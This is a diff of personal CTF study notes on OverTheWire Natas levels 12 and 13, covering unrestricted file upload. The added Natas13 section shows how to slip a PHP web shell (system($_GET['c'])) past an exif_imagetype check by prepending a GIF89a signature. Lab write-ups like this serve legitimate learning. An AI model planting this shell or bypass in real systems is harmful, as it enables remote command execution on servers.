@@ -4,8 +4,7 @@
 Source: #youtube #overthewire #natas #web 
 
 Tags: [[Local File Inclusion & Command Injection]]
-
-Natas12
+## Natas12
 
 we have a unrestricted file upload functionality 
 
@@ -34,6 +33,21 @@ print(response.text)
 2. the output of the commented code will reveal the newly created file name on the server of the file that we uploaded 
 3. in our case the path is `upload/kx42yjw6zv.php`
 4. we append the path to the `url` and try executing commands by adding our commands to the previously defined `c` parameter.
+## Natas13
+
+similar to natas12, here we have a `php` module named `exif_imagetype` that [[image upload]]checks if the file uploaded is an image and within the size limit of 1kb 
+
+`exif_imagetype` checks for file signatures
+
+we add `GIF89a` at the start of our payload `php` file making the contents of the file as 
+```
+GIF89a
+<?php
+system($_GET['c']);
+?>
+```
+
+rest of the process is same as natas12
 
 ### References
 https://www.youtube.com/watch?v=fqwxYowJA0c
